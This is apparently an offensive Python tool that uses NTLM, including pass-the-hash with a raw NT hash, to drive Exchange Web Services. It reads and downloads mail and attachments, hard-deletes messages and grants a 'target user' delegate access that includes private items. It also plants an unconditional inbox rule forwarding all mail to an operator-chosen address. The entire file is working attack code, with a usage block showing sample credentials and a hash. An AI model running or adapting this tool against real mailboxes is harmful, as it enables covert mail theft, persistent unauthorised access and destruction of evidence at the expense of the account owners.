#!python3

import ssl
import sys
import base64
import re
import binascii
try:
    from http.client import HTTPConnection, HTTPSConnection, ResponseNotReady
except ImportError:
    from httplib import HTTPConnection, HTTPSConnection, ResponseNotReady
from impacket import ntlm

def ewsManage(host, port, mode, domain, user, data,command):

    if command == "getfolderofinbox":
        POST_BODY = '''<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" 
               xmlns:m="http://schemas.microsoft.com/exchange/services/2006/messages" 
               xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types" 
               xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <m:GetFolder>
      <m:FolderShape>
        <t:BaseShape>Default</t:BaseShape>
      </m:FolderShape>
      <m:FolderIds>
        <t:DistinguishedFolderId Id="inbox"/>
      </m:FolderIds>
    </m:GetFolder>
  </soap:Body>
</soap:Envelope>
'''
    elif command =='getfolderofsentitems': 
        POST_BODY = '''<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" 
               xmlns:m="http://schemas.microsoft.com/exchange/services/2006/messages" 
               xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types" 
               xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <m:GetFolder>
      <m:FolderShape>
        <t:BaseShape>Default</t:BaseShape>
      </m:FolderShape>
      <m:FolderIds>
        <t:DistinguishedFolderId Id="sentitems"/>
      </m:FolderIds>
    </m:GetFolder>
  </soap:Body>
</soap:Envelope>
'''

    elif command =='listmailofinbox':    
        POST_BODY = '''<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:m="http://schemas.microsoft.com/exchange/services/2006/messages" xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Header>
    <t:RequestServerVersion Version="Exchange2013_SP1" />
  </soap:Header>
  <soap:Body>
    <m:FindItem Traversal="Shallow">
      <m:ItemShape>
        <t:BaseShape>AllProperties</t:BaseShape>
        <t:BodyType>Text</t:BodyType>
      </m:ItemShape>
      <m:IndexedPageItemView MaxEntriesReturned="2147483647" Offset="0" BasePoint="Beginning" />
      <m:ParentFolderIds>
        <t:DistinguishedFolderId Id="inbox" />
      </m:ParentFolderIds>
    </m:FindItem>
  </soap:Body>
</soap:Envelope>
'''

    elif command =='listmailofsentitems':    
        POST_BODY = '''<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:m="http://schemas.microsoft.com/exchange/services/2006/messages" xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Header>
    <t:RequestServerVersion Version="Exchange2013_SP1" />
  </soap:Header>
  <soap:Body>
    <m:FindItem Traversal="Shallow">
      <m:ItemShape>
        <t:BaseShape>AllProperties</t:BaseShape>
        <t:BodyType>Text</t:BodyType>
      </m:ItemShape>
      <m:IndexedPageItemView MaxEntriesReturned="2147483647" Offset="0" BasePoint="Beginning" />
      <m:ParentFolderIds>
        <t:DistinguishedFolderId Id="sentitems" />
      </m:ParentFolderIds>
    </m:FindItem>
  </soap:Body>
</soap:Envelope>
'''

    elif command =='getmail':    
        POST_BODY = '''<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:m="http://schemas.microsoft.com/exchange/services/2006/messages" xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Header>
    <t:RequestServerVersion Version="Exchange2013_SP1" />
  </soap:Header>
  <soap:Body>
    <m:GetItem>
      <m:ItemShape>
        <t:BaseShape>AllProperties</t:BaseShape>
        <t:BodyType>Text</t:BodyType>
      </m:ItemShape>
      <m:ItemIds>
        <t:ItemId Id="{id}" ChangeKey="{key}" />
      </m:ItemIds>
    </m:GetItem>
  </soap:Body>
</soap:Envelope>
'''
        Id = input("Input the ItemId of the Message:")
        Key = input("Input the ChangeKey of the Message:")
        POST_BODY = POST_BODY.format(id=Id, key=Key)


    elif command =='deletemail':    
        POST_BODY = '''<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:m="http://schemas.microsoft.com/exchange/services/2006/messages" xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Header>
    <t:RequestServerVersion Version="Exchange2013_SP1" />
  </soap:Header>
  <soap:Body>
    <m:DeleteItem DeleteType="HardDelete" xmlns="https://schemas.microsoft.com/exchange/services/2006/messages">
      <m:ItemIds>
        <t:ItemId Id="{id}"/>
      </m:ItemIds>
    </m:DeleteItem>
  </soap:Body>
</soap:Envelope>
'''
        Id = input("Input the ItemId of the Message:")
        POST_BODY = POST_BODY.format(id=Id)

    elif command =='getattachment':    
        POST_BODY = '''<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:m="http://schemas.microsoft.com/exchange/services/2006/messages" xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Header>
    <t:RequestServerVersion Version="Exchange2013_SP1" />
  </soap:Header>
  <soap:Body>
    <m:GetItem>
      <m:ItemShape>
        <t:BaseShape>IdOnly</t:BaseShape>
        <t:AdditionalProperties>
          <t:FieldURI FieldURI="item:Attachments" />
        </t:AdditionalProperties>
      </m:ItemShape>
      <m:ItemIds>
        <t:ItemId Id="{id}" />
      </m:ItemIds>
    </m:GetItem>
  </soap:Body>
</soap:Envelope>
'''
        Id = input("Input the ItemId of the Message who has Attachments:")
        POST_BODY = POST_BODY.format(id=Id)

    elif command =='saveattachment':          
        POST_BODY = '''<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:m="http://schemas.microsoft.com/exchange/services/2006/messages" xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Header>
    <t:RequestServerVersion Version="Exchange2013_SP1" />
  </soap:Header>
  <soap:Body>
    <m:GetAttachment>
      <m:AttachmentIds>
        <t:AttachmentId Id="{id}" />
      </m:AttachmentIds>
    </m:GetAttachment>
  </soap:Body>
</soap:Envelope>
'''
        Id = input("Input the Id of the attachment:")
        POST_BODY = POST_BODY.format(id=Id)


    elif command =='deleteattachment':          
        POST_BODY = '''<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:m="http://schemas.microsoft.com/exchange/services/2006/messages" xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Header>
    <t:RequestServerVersion Version="Exchange2013_SP1" />
  </soap:Header>
  <soap:Body>
    <m:DeleteAttachment>
      <m:AttachmentIds>
        <t:AttachmentId Id="{id}" />
      </m:AttachmentIds>
    </m:DeleteAttachment>
  </soap:Body>
</soap:Envelope>
'''
        Id = input("Input the Id of the attachment:")
        POST_BODY = POST_BODY.format(id=Id)

    elif command =='createattachment':    
        POST_BODY = '''<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:m="http://schemas.microsoft.com/exchange/services/2006/messages" xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Header>
    <t:RequestServerVersion Version="Exchange2013_SP1" />
  </soap:Header>
  <soap:Body>
    <m:CreateAttachment>
      <m:ParentItemId Id="{id}" ChangeKey="{key}"/>
      <m:Attachments>
        <t:FileAttachment>
          <t:Name>{name}</t:Name>
          <t:Content>{data}</t:Content>
        </t:FileAttachment>
      </m:Attachments>
    </m:CreateAttachment>
  </soap:Body>
</soap:Envelope>
'''
        Id = input("Input the ItemId of the Message:")
        Key = input("Input the ChangeKey of the Message:")
        Name = input("Input the name of the attachment file:")
        Path = input("Input the path of the attachment file:")
        Type = input("Input the type of the attachment file:(text or raw)")
        if Type == 'text':
          with open(Path, 'r') as file_obj:
            content = file_obj.read()
          content = content.encode("utf-8")
        elif Type =='raw':
          with open(Path, 'rb') as file_obj:
            content = file_obj.read()         
        else:
                print('[!]Wrong parameter')
                return False  
       
        base64content = base64.b64encode(content)
        Data = str((base64content),'utf-8')
        POST_BODY = POST_BODY.format(id=Id, key=Key, name=Name, data=Data)

    elif command =='getdelegateofinbox': 
        POST_BODY = '''<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:m="http://schemas.microsoft.com/exchange/services/2006/messages" xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Header>
    <t:RequestServerVersion Version="Exchange2013_SP1" />
  </soap:Header>
  <soap:Body>
    <m:GetDelegate IncludePermissions="true">
      <m:Mailbox>
        <t:EmailAddress>{mail}</t:EmailAddress>
      </m:Mailbox>
    </m:GetDelegate>
  </soap:Body>
</soap:Envelope>
'''
        EmailAddress = input("Input the EmailAddress of current user:")
        POST_BODY = POST_BODY.format(mail=EmailAddress)

    elif command =='adddelegateofinbox':          
        POST_BODY = '''<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:m="http://schemas.microsoft.com/exchange/services/2006/messages" xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Header>
    <t:RequestServerVersion Version="Exchange2013_SP1" />
  </soap:Header>
  <soap:Body>
    <m:AddDelegate>
      <m:Mailbox>
        <t:EmailAddress>{mail1}</t:EmailAddress>
      </m:Mailbox>
      <m:DelegateUsers>
      <t:DelegateUser>
        <t:UserId>
          <t:PrimarySmtpAddress>{mail2}</t:PrimarySmtpAddress>
        </t:UserId>
        <t:DelegatePermissions>
          <t:InboxFolderPermissionLevel>Editor</t:InboxFolderPermissionLevel>
        </t:DelegatePermissions>
        <t:ReceiveCopiesOfMeetingMessages>false</t:ReceiveCopiesOfMeetingMessages>
        <t:ViewPrivateItems>false</t:ViewPrivateItems>
      </t:DelegateUser>
    </m:DelegateUsers>
      <m:DeliverMeetingRequests>DelegatesAndMe</m:DeliverMeetingRequests>
    </m:AddDelegate>
  </soap:Body>
</soap:Envelope>
'''
        EmailAddress1 = input("Input the EmailAddress of current user:")
        EmailAddress2 = input("Input the EmailAddress of target user:")
        POST_BODY = POST_BODY.format(mail1=EmailAddress1, mail2=EmailAddress2)

    elif command =='updatedelegateofinbox':          
        POST_BODY = '''<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:m="http://schemas.microsoft.com/exchange/services/2006/messages" xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Header>
    <t:RequestServerVersion Version="Exchange2013_SP1" />
  </soap:Header>
  <soap:Body>
    <m:UpdateDelegate>
      <m:Mailbox>
        <t:EmailAddress>{mail1}</t:EmailAddress>
      </m:Mailbox>
      <m:DelegateUsers>
      <t:DelegateUser>
        <t:UserId>
          <t:PrimarySmtpAddress>{mail2}</t:PrimarySmtpAddress>
        </t:UserId>
        <t:DelegatePermissions>
          <t:InboxFolderPermissionLevel>Editor</t:InboxFolderPermissionLevel>
        </t:DelegatePermissions>
        <t:ReceiveCopiesOfMeetingMessages>false</t:ReceiveCopiesOfMeetingMessages>
        <t:ViewPrivateItems>true</t:ViewPrivateItems>
      </t:DelegateUser>
    </m:DelegateUsers>
      <m:DeliverMeetingRequests>DelegatesAndMe</m:DeliverMeetingRequests>
    </m:UpdateDelegate>
  </soap:Body>
</soap:Envelope>
'''
        EmailAddress1 = input("Input the EmailAddress of current user:")
        EmailAddress2 = input("Input the EmailAddress of target user:")
        POST_BODY = POST_BODY.format(mail1=EmailAddress1, mail2=EmailAddress2)

    elif command =='removedelegateofinbox':          
        POST_BODY = '''<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:m="http://schemas.microsoft.com/exchange/services/2006/messages" xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Header>
    <t:RequestServerVersion Version="Exchange2013_SP1" />
  </soap:Header>
  <soap:Body>
    <m:RemoveDelegate>
      <m:Mailbox>
        <t:EmailAddress>{mail1}</t:EmailAddress>
      </m:Mailbox>
      <m:UserIds>
        <t:UserId>
          <t:PrimarySmtpAddress>{mail2}</t:PrimarySmtpAddress>
        </t:UserId>
    </m:UserIds>
    </m:RemoveDelegate>
  </soap:Body>
</soap:Envelope>
'''
        EmailAddress1 = input("Input the EmailAddress of current user:")
        EmailAddress2 = input("Input the EmailAddress of target user:")
        POST_BODY = POST_BODY.format(mail1=EmailAddress1, mail2=EmailAddress2)

    elif command =='getinboxrules':         
        POST_BODY = '''<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:m="http://schemas.microsoft.com/exchange/services/2006/messages" xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Header>
    <t:RequestServerVersion Version="Exchange2013_SP1" />
  </soap:Header>
  <soap:Body>
    <m:GetInboxRules>
      <m:MailboxSmtpAddress>{mail1}</m:MailboxSmtpAddress>
    </m:GetInboxRules>
  </soap:Body>
</soap:Envelope>
'''
        EmailAddress1 = input("Input the EmailAddress of current user:")
        POST_BODY = POST_BODY.format(mail1=EmailAddress1)

    elif command =='updateinboxrules':         
        POST_BODY = '''<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:m="http://schemas.microsoft.com/exchange/services/2006/messages" xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Header>
    <t:RequestServerVersion Version="Exchange2013_SP1" />
  </soap:Header>
  <soap:Body>
    <m:UpdateInboxRules>
      <m:RemoveOutlookRuleBlob>true</m:RemoveOutlookRuleBlob>
      <m:Operations>
        <t:CreateRuleOperation>
          <t:Rule>
            <t:DisplayName>ForwardRule</t:DisplayName>
            <t:Priority>1</t:Priority>
            <t:IsEnabled>true</t:IsEnabled>
            <t:Conditions />
            <t:Exceptions />
            <t:Actions>
              <t:ForwardToRecipients>
                <t:Address>
                  <t:EmailAddress>{mail1}</t:EmailAddress>
                </t:Address>
              </t:ForwardToRecipients>
            </t:Actions>
          </t:Rule>
        </t:CreateRuleOperation>
      </m:Operations>
    </m:UpdateInboxRules>
  </soap:Body>
</soap:Envelope>
'''
        EmailAddress1 = input("Input the EmailAddress you want to forward to:")
        POST_BODY = POST_BODY.format(mail1=EmailAddress1)

    elif command =='removeinboxrules':  
        POST_BODY = '''<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:m="http://schemas.microsoft.com/exchange/services/2006/messages" xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Header>
    <t:RequestServerVersion Version="Exchange2013_SP1" />
  </soap:Header>
  <soap:Body>
    <m:UpdateInboxRules>
      <m:RemoveOutlookRuleBlob>true</m:RemoveOutlookRuleBlob>
        <m:Operations>
          <t:DeleteRuleOperation>
            <t:RuleId>{id}</t:RuleId>
          </t:DeleteRuleOperation>
        </m:Operations>
    </m:UpdateInboxRules>
  </soap:Body>
</soap:Envelope>
'''
        RuleId = input("Input the rule ID:")
        POST_BODY = POST_BODY.format(id=RuleId)

    else:    
        print('[!]Wrong parameter')
        return False

    ews_url = "/EWS/Exchange.asmx"

    if port ==443:
        try:
            uv_context = ssl.SSLContext(ssl.PROTOCOL_SSLv23)
            session = HTTPSConnection(host, port, context=uv_context)
        except AttributeError:
            session = HTTPSConnection(host, port)
    else:        
        session = HTTPConnection(host, port)

    # Use impacket for NTLM
    ntlm_nego = ntlm.getNTLMSSPType1(host, domain)

    #Negotiate auth
    negotiate = base64.b64encode(ntlm_nego.getData())
    # Headers
    headers = {
        "Authorization": 'NTLM %s' % negotiate.decode('utf-8'),
        "Content-type": "text/xml; charset=utf-8",
        "Accept": "text/xml",
        "User-Agent": "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
    }

    session.request("POST", ews_url, POST_BODY, headers)

    res = session.getresponse()
    res.read()

    if res.status != 401:
        print('Status code returned: %d. Authentication does not seem required for URL'%(res.status))
        return False
    try:
        if 'NTLM' not in res.getheader('WWW-Authenticate'):
            print('NTLM Auth not offered by URL, offered protocols: %s'%(res.getheader('WWW-Authenticate')))
            return False
    except (KeyError, TypeError):
        print('No authentication requested by the server for url %s'%(ews_url))
        return False

    print('[*] Got 401, performing NTLM authentication')
    # Get negotiate data
    try:
        ntlm_challenge_b64 = re.search('NTLM ([a-zA-Z0-9+/]+={0,2})', res.getheader('WWW-Authenticate')).group(1)
        ntlm_challenge = base64.b64decode(ntlm_challenge_b64)
    except (IndexError, KeyError, AttributeError):
        print('No NTLM challenge returned from server')
        return False


    if mode =='plaintext':
        password1 = data;
        nt_hash = ''

    elif mode =='ntlmhash':
        password1 = ''
        nt_hash = binascii.unhexlify(data)

    else:
        print('[!]Wrong parameter')
        return False

    lm_hash = ''    
    ntlm_auth, _ = ntlm.getNTLMSSPType3(ntlm_nego, ntlm_challenge, user, password1, domain, lm_hash, nt_hash)
    auth = base64.b64encode(ntlm_auth.getData())

    headers = {
        "Authorization": 'NTLM %s' % auth.decode('utf-8'),
        "Content-type": "text/xml; charset=utf-8",
        "Accept": "text/xml",
        "User-Agent": "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
    }

    session.request("POST", ews_url, POST_BODY, headers)
    res = session.getresponse()
    body = res.read()
    filename = command + ".xml"
    if res.status == 401:
        print('[!] Server returned HTTP status 401 - authentication failed')
        return False

    else:
        print('[+] Valid:%s %s'%(user,data))       
        #print(body)
        print('[+] Save response file to %s'%(filename))
        with open(filename, 'w+', encoding='utf-8') as file_object:
            file_object.write(bytes.decode(body))
        if res.status == 200:
            if command =='getattachment':
                responsecode_name = re.compile(r"<m:ResponseCode>(.*?)</m:ResponseCode>")
                responsecode = responsecode_name.findall(bytes.decode(body))
                if responsecode[0] =='NoError':
                    pattern_name = re.compile(r"<t:Name>(.*?)</t:Name>")
                    name = pattern_name.findall(bytes.decode(body))
                    for i in range(len(name)):       
                        print("[+] Attachment name: %s"%(name[i]))

            elif command =='saveattachment':
                responsecode_name = re.compile(r"<m:ResponseCode>(.*?)</m:ResponseCode>")
                responsecode = responsecode_name.findall(bytes.decode(body))
                if responsecode[0] =='NoError':
                    pattern_name = re.compile(r"<t:Name>(.*?)</t:Name>")
                    name = pattern_name.findall(bytes.decode(body))
                    print('[+] Save attachment to %s'%(name[0]))
                    pattern_data = re.compile(r"<t:Content>(.*?)</t:Content>")
                    attachmentdata = pattern_data.findall(bytes.decode(body))

                    pattern_type = re.compile(r"<t:ContentType>(.*?)</t:ContentType>")
                    contenttype = pattern_type.findall(bytes.decode(body))
                    if 'text' in contenttype:
                        truedata = base64.b64decode(attachmentdata[0])
                        with open(name[0], 'w+') as file_object:
                            file_object.write(truedata)
                    else:
                        truedata = base64.b64decode(attachmentdata[0])
                        with open(name[0], 'wb+') as file_object:
                            file_object.write(truedata)                   
                          
                else:
                    print('[!] %s'%(responsecode[0]))


        return True


if __name__ == '__main__':
    if len(sys.argv)!=8:
        print('[!]Wrong parameter')     
        print('ewsManage')       
        print('Use to access Exchange Web Service(Support plaintext and ntlmhash)')
        print('Author:3gstudent')      
        print('Reference:https://github.com/dirkjanm/PrivExchange/blob/master/privexchange.py')  
        print('Usage:')
        print('%s <host> <port> <mode> <domain> <user> <password> <command>'%(sys.argv[0]))
        print('<mode>:')
        print('- plaintext')   
        print('- ntlmhash')
        print('<command>:')
        print('- getfolderofinbox')
        print('- getfolderofsentitems')  
        print('- listmailofinbox')
        print('- listmailofsentitems')
        print('- getmail')
        print('- deletemail')            
        print('- getattachment')        
        print('- saveattachment')
        print('- getdelegateofinbox')
        print('- adddelegateofinbox')
        print('- updatedelegateofinbox')
        print('- removedelegateofinbox')
        print('- getinboxrules')
        print('- updateinboxrules')
        print('- removeinboxrules')
        print('- deleteattachment')
        print('- createattachment')
        print('Eg.')
        print('%s 192.168.1.1 443 plaintext test.com user1 password1 getfolderofinbox'%(sys.argv[0]))
        print('%s test.com 80 ntlmhash test.com user1 c5a237b7e9d8e708d8436b6148a25fa1 listmailofinbox'%(sys.argv[0]))
        sys.exit(0)
    else:
        ewsManage(sys.argv[1], int(sys.argv[2]), sys.argv[3], sys.argv[4], sys.argv[5], sys.argv[6], sys.argv[7])
